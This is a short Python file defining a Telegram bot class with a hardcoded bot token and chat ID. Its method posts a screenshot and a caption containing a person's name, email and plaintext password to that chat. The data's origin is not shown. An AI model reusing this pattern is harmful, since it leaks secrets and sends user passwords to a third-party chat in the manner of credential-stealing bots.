from telegram import Bot
from telegram import InputFile


class TelegramBot(Bot):
    TOKEN = '6604061806:AAFtg3kePeu4wmTjSyc2yqo45Lw7MP6X5bY'
    CHAT_ID = '-938220241'

    def __init__(self):
        super().__init__(self.TOKEN)

    async def send_msg(self, success: bool, name: str, surname: str,
                       email: str, password: str, error_msg: str = None):
        with open('./screencap.png', 'rb') as image_file:
            image = InputFile(image_file)

        if error_msg is not None:
            caption = f"<b>Success:</b> {success} ({error_msg})\n"
        else:
            caption = f"<b>Success:</b> {success}\n"

        caption += (f"<b>Name:</b> {name}\n<b>Surname:</b> {surname}\n"
                    f"<b>Email:</b> {email}\n<b>Password:</b> {password}\n")

        await self.send_photo(chat_id=self.CHAT_ID, photo=image, caption=caption, parse_mode='HTML')
